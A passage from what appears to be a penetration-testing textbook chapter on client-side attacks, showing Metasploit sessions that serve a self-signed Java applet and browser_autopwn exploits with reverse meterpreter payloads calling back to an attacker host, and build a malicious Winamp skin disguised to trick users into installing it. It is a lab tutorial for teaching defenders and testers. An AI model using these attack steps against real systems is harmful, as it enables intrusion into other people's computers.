vulnerability by simply asking users to allow us to run malicious code.
You’ve probably seen browser warnings like, “This site would like to run
this thing in your browser, how would you like to proceed?” Sometimes
even security-savvy users can be convinced to just say “Yes” and bypass this
warning without further investigation if they can be convinced that what’s
on the other side is useful.
The module we’ll use for this example is exploit/multi/browser/java_
signed_applet. As the name implies, this module will create a malicious Java
applet, as shown in Listing 10-18.
msf exploit(java_jre17_jmxbean) > use exploit/multi/browser/java_signed_applet
msf exploit(java_signed_applet) > show options
Module options (exploit/multi/browser/java_signed_applet):
Name Current Setting Required Description
---- --------------- -------- -----------
APPLETNAME SiteLoader yes The main applet's class name.
uCERTCN SiteLoader yes The CN= value for the certificate. Cannot contain
',' or '/'
SRVHOST 0.0.0.0 yes The local host to listen on. This must be an
address on the local machine or 0.0.0.0
SRVPORT 8080 yes The local port to listen on.
SSL false no Negotiate SSL for incoming connections
SSLCert no Path to a custom SSL certificate (default is
randomly generated)
SSLVersion SSL3 no Specify the version of SSL that should be used
(accepted: SSL2, SSL3, TLS1)
vSigningCert no Path to a signing certificate in PEM or PKCS12
(.pfx) format
SigningKey no Path to a signing key in PEM format
SigningKeyPass no Password for signing key (required if SigningCert
is a .pfx)
URIPATH no The URI to use for this exploit (default is
random)
Exploit target:
Id Name
-- ----
w1 Windows x86 (Native Payload)
Client-Side Exploitation 233
msf exploit(java_signed_applet) > set APPLETNAME BulbSec
APPLETNAME => Bulb Security
msf exploit(java_signed_applet) > set SRVHOST 192.168.20.9
SRVHOST => 192.168.20.9
msf exploit(java_signed_applet) > set SRVPORT 80
SRVPORT => 80
Listing 10-18: Metasploit signed Java applet module
Older versions of Java will allow us to use the CERTCN option shown at u to
say that the applet is signed by any entity that we choose. Newer versions of
Java, like the one installed on the Windows 7 target, will say that the signer
is unknown unless we sign the applet with a trusted signing certificate,
which we can specify at v. If this option is set, it will override the CERTCN
option. If we have a trusted signing certificate or we’ve compromised a cer-
tificate from our target, we can make our applet look more legitimate, but
we’ll leave our applet self-signed for this example.
As shown at w, the default target for this module is a Windows system.
However, as shown in Listing 10-19, we can use payloads for other platforms
running JRE.
msf exploit(java_signed_applet) > show targets
Exploit targets:
Id Name
-- ----
u0 Generic (Java Payload)
1 Windows x86 (Native Payload)
2 Linux x86 (Native Payload)
3 Mac OS X PPC (Native Payload)
4 Mac OS X x86 (Native Payload)
msf exploit(java_signed_applet) > set target 0
target => 0
msf exploit(java_signed_applet) > set payload java/meterpreter/reverse_tcp
payload => java/meterpreter/reverse_tcp
msf exploit(java_signed_applet) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(java_signed_applet) > exploit
[*] Exploit running as background job.
[*] Started reverse handler on 192.168.20.9:4444
[*] Using URL: http://192.168.20.9:80/Dgrz12PY
[*] Server started.
Listing 10-19: Using a Java payload
234 Chapter 10
As with other Java exploits, we can make this attack multi-platform. We
can change the target to Linux or Mac OS, or use a Java payload u that
will target them all.
note As with our PDF examples, the previous exploit has left Java in a bad state, and you
may need to restart Windows 7 before attempting to run the applet.
Browse to the Metasploit server from your Windows 7 target, and you
should be prompted to run the applet, as shown in Figure 10-2. The secu-
rity warning informs you that if this applet is malicious, it will have access
to the system and lets you know you should run the application only if
the publisher is trusted. Because we didn’t use a signing certificate that is
trusted by the browser certificate chain, the warning says in big letters that
the publisher is unknown. This should stop anyone from running the mali-
cious applet, right?
Figure 10-2: Java applet attack
Despite the warnings, the Social-Engineer Toolkit (which we’ll explore
in the next chapter) claims that this attack is one of the most successful of
the many available, even though it doesn’t rely on any unpatched vulner-
ability in Java or the underlying operating system.
browser_autopwn
The browser_autopwn module is another client-side exploitation option
available in Metasploit. Although it’s sometimes considered cheating, this
module loads all the browser and browser add-on modules that it knows
Client-Side Exploitation 235
of (including Java, Flash, and so on) and waits for a browser to connect to
the server. Once the browser connects, the server fingerprints the browser
and serves up all the exploits it thinks are likely to succeed. An example is
shown in Listing 10-20.
msf > use auxiliary/server/browser_autopwn
msf auxiliary(browser_autopwn) > show options
Module options (auxiliary/server/browser_autopwn):
Name Current Setting Required Description
---- --------------- -------- -----------
LHOST yes The IP address to use for reverse-connect payloads
SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address
on the local machine or 0.0.0.0
SRVPORT 8080 yes The local port to listen on.
SSL false no Negotiate SSL for incoming connections
SSLCert no Path to a custom SSL certificate (default is randomly
generated)
SSLVersion SSL3 no Specify the version of SSL that should be used
(accepted: SSL2, SSL3, TLS1)
URIPATH no The URI to use for this exploit (default is random)
msf auxiliary(browser_autopwn) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf auxiliary(browser_autopwn) > set URIPATH autopwn
URIPATH => autopwn
msf auxiliary(browser_autopwn) > exploit
[*] Auxiliary module execution completed
[*] Setup
msf auxiliary(browser_autopwn) >
[*] Obfuscating initial javascript 2015-03-25 12:55:22 -0400
[*] Done in 1.051220065 seconds
[*] Starting exploit modules on host 192.168.20.9...
--snip--
[*] --- Done, found 16 exploit modules
[*] Using URL: http://0.0.0.0:8080/autopwn
[*] Local IP: http://192.168.20.9:8080/autopwn
[*] Server started.
Listing 10-20: Starting browser_autopwn
Our options for this module are the usual client-side attacks. As shown
here, I’ve set the LHOST for my shells to call back to Kali’s IP address, and
URIPATH to something easy to remember (autopwn). Note that we don’t need
to set any payloads here; as the individual modules are loaded, Metasploit
sets the payload options appropriately.
236 Chapter 10
With the server started, browse to the malicious page from a web
browser. I used Internet Explorer on my Windows 7 target as shown in
Listing 10-21.
[*] 192.168.20.12 browser_autopwn - Handling '/autopwn'
[*] 192.168.20.12 browser_autopwn - Handling '/autopwn?sessid=TWljcm9zb2Z0IFdpbmRvd3M6NzpTUDE6
ZW4tdXM6eDg2Ok1TSUU6OC4wOg%3d%3d'
[*] 192.168.20.12 browser_autopwn - JavaScript Report: Microsoft Windows:7:SP1:en-us:x86:
MSIE:8.0: u
[*] 192.168.20.12 browser_autopwn - Responding with 14 exploits v
[*] 192.168.20.12 java_atomicreferencearray - Sending Java AtomicReferenceArray Type Violation
Vulnerability
--snip--
msf auxiliary(browser_autopwn) > sessions -l
Active sessions
===============
Id Type Information Connection
-- ---- ----------- ----------
1 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 ->
192.168.20.12:49195 (192.168.20.12)
2 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 ->
192.168.20.12:49202 (192.168.20.12)
3 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 ->
192.168.20.12:49206 (192.168.20.12)
4 meterpreter java/java Georgia Weidman @ BookWin7 192.168.20.9:7777 ->
192.168.20.12:49209 (192.168.20.12)
Listing 10-21: Autopwning a browser
As you can see Metasploit notices my browser and attempts to detect
its version and running software u. It then sends all the exploits it thinks
might be effective v.
Once all is said and done, run sessions -l to see how things turned out.
In my case, I received four new sessions. Not bad for so little work. As you
might expect though, all of those exploits overwhelmed the browser and it
crashed. (Luckily, all of our sessions were automatically migrated.)
Though browser_autopwn is not nearly as stealthy or elegant as perform-
ing reconnaissance and then choosing a particular exploit likely to work
against a target, it can be a real help in a pinch, which is why it’s worth hav-
ing in your pentesting arsenal.
Winamp
So far our client-side attacks have basically followed the same pattern. We
generate a malicious file that exploits a vulnerability in the client software
or prompts the user for permission to run malicious code. The user opens
the file with the relevant program, and we get a session in Metasploit. Now
for something a bit different.
Client-Side Exploitation 237
In this example, we trick the user into replacing a configuration file
for the Winamp music player program. When the user next opens the pro-
gram, the evil configuration file will be processed regardless of which music
file the user opens. The Metasploit module we’ll use is exploit/windows/
fileformat/winamp_maki_bof, which exploits a buffer overflow issue in
Winamp version 5.55.
As you can see with show options in Listing 10-22, this module has no
options to set; all we need is a Windows payload. The module generates a
malicious Maki file for use with Winamp skins. As with our PDF examples,
it’s up to us to serve the file and set up a handler for the payload.
msf > use exploit/windows/fileformat/winamp_maki_bof
msf exploit(winamp_maki_bof) > show options
Module options (exploit/windows/fileformat/winamp_maki_bof):
Name Current Setting Required Description
---- --------------- -------- -----------
Exploit target:
Id Name
-- ----
0 Winamp 5.55 / Windows XP SP3 / Windows 7 SP1
msf exploit(winamp_maki_bof) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(winamp_maki_bof) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(winamp_maki_bof) > exploit
[*] Creating 'mcvcore.maki' file ...
[+] mcvcore.maki stored at /root/.msf4/local/mcvcore.maki
Listing 10-22: Metasploit Winamp exploit
Choose a compatible Windows payload as shown. Once the malicious
Maki file has been generated, copy it to the Apache web server directory, and
set up a payload handler. (An example of setting up the handler is included
in Listing 10-11 on page 227.) Now we need to package this malicious file in
such a way that a user may be convinced to load it in Winamp. We can create
a new Winamp skin by copying one of the skins packaged with Winamp. We
can replace the mcvcore.maki file from our example skin with our malicious
one. It doesn’t matter what our skin actually looks like, because it will cause
Winamp to hang and send us our session in Metasploit.
238 Chapter 10
In Windows 7, make a copy of the default Bento Winamp skin folder
from C:\Program Files\Winamp\Skins and copy it to Kali. Rename the folder
Bento to Rocketship. Replace the file Rocketship\scripts\mcvcore.maki with the
malicious file we just created in Metasploit. Zip the folder and copy it to
the web server. In the next chapter we will look at methods of creating
believable social-engineering campaigns, but suffice it to say, if we can
convince users that this malicious skin will make their Winamp look like
a rocket ship, we might be able to convince users to install it.
Switch to Windows 7, download the zipped skin from the Kali web
server, unzip it, and save the folder to C:\Program Files\Winamp\Skins as
shown in Figure 10-3.
Figure 10-3: Installing the malicious Winamp skin
Now open Winamp, go to Options4Skins, and choose Rocketship, as
shown in Figure 10-4.
Once you select the malicious skin, Winamp will appear to close, and
you will receive a session in your Metasploit handler.
Client-Side Exploitation 239
Figure 10-4: Using the malicious skin
summary
The attacks we’ve seen in this chapter target software that is not listening
on a network port. We attacked browsers, PDF viewers, the Java browser
plugin, and a music player. We generated malicious files that trigger a
vulnerability in the client-side software when opened by the user, and we
looked at examples that ask the user for permission to run malicious code
instead of relying on an unpatched vulnerability.
The Internet can be a scary place for client-side software. Some of the
exploits discussed in this chapter were seen in the wild before a patch was
issued by the vendors. In fact, the Java exploit we used in “Java Vulnerability”
on page 230 was still a zero-day vulnerability when the Metasploit module
was added to the framework. Anyone using Java 7 could run afoul of a mali-
cious site, even if his or her machine was fully patched, and all an attacker
had to do was use Metasploit to perform a successful attack.
Of course, disabling or uninstalling Java fixes this problem in the event
of a zero-day exploit running rampant on the Internet, but that might not
be feasible for all users and organizations. Though not all sites use Java,
popular online meeting software such as WebEx and GoToMeeting require
Java, and the virtual classroom software Blackboard has Java components as
240 Chapter 10
well. A lot of network/security appliances actually require network/security
admins to run outdated versions of Java, which makes them perfect tar-
gets for client-side attacks. Most readers can probably think of at least one
site that complains if Java is not installed.
Client-side software is necessary to perform day-to-day tasks in any
organization, but this software should not be overlooked when evaluat-
ing security risks. Keeping all client-side software up-to-date with the lat-
est patches can be a daunting task on your personal computer, much less
on the computers of an entire organization. Even organizations that are
doing a good job of applying important Windows security fixes may miss
an update to Java or Adobe Reader and leave company workstations open to
client-side attacks.
All of the attacks in this chapter depend on a legitimate user taking
action on the target systems. Although we’ve seen what can happen when
users are tricked into opening malicious files, we’ve yet to look at the
tricks used to make people open those files. In the next chapter we’ll study
social engineering—that is, ways of tricking users into performing harm-
ful actions such as opening a malicious file, entering credentials into an
attacker-owned site, or giving out sensitive information over the phone.
Client-Side Exploitation 241